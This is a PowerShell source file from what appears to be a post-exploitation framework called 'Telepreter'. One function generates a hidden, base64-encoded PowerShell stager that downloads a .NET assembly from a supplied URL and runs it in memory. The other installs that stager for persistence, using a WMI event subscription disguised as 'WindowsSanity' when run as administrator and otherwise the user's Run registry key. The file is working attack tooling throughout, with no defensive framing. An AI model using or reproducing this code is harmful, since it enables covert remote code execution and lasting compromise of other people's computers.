function Invoke-TelepreterStager
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, Position = 0)]
        [string]$URL
    )
    $RequestCode = "[Reflection.Assembly]::Load((iwr ""$URL"").Content);"
    $RequestCode += '$a=[Telepreter.Agent]::new();$a.Load();$a.Start()'
    $Base64Stager = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RequestCode))
    
    $FinalPayload = "powershell.exe -nop -ep bypass -w hidden -enc $Base64Stager"
    Write-Verbose "Payload generated has $($FinalPayload.Length) bytes."
    Write-Output $FinalPayload
}
function Add-TelepreterPersistence
{
    Param(
        [Parameter(Mandatory = $True, Position = 0)]
        [string]$URL
    )
    $Payload = (Invoke-TelepreterStager -URL $URL);
    $filterName = "WindowsSanity"
    $filterNS = "root\cimv2"
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
    if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
    {
        $TimerArgs = @{
            IntervalBetweenEvents = ([UInt32] 10000) # 43200000 to trigger every 12 hours
            SkipIfPassed = $False
            TimerId = $filterName
        }

        $Timer = Set-WmiInstance -Namespace root/cimv2 -Class __IntervalTimerInstruction -Arguments $TimerArgs
        
        $EventFilterArgs = @{
            EventNamespace = 'root/cimv2'
            Name = $FilterName
            Query = "SELECT * FROM __IntervalTimerInstruction WHERE TimerID = '$filterName'"
            QueryLanguage = 'WQL'
        }

        Write-Verbose "Creating reboot persistence. The payload executes on every computer restart"
        Write-Verbose "Creating a filter with name $filtername for executing script in memory from $PayloadURL"
        #$filterPath = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
        $FilterPath = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs
        $consumerPath = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{name=$filterName; CommandLineTemplate = $Payload}
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
        Write-Output "Registered persistence method in SYSTEM-mode."
    }
    else
    {        
        Write-Verbose "Not running with elevated privileges. Using RUN regsitry key"
        New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\ -Name $filterName -PropertyType String -Value "C:\windows\system32\windowspowershell\v1.0\$Payload" -force
        Write-Output "Registered persistence method in user-mode."
    }
}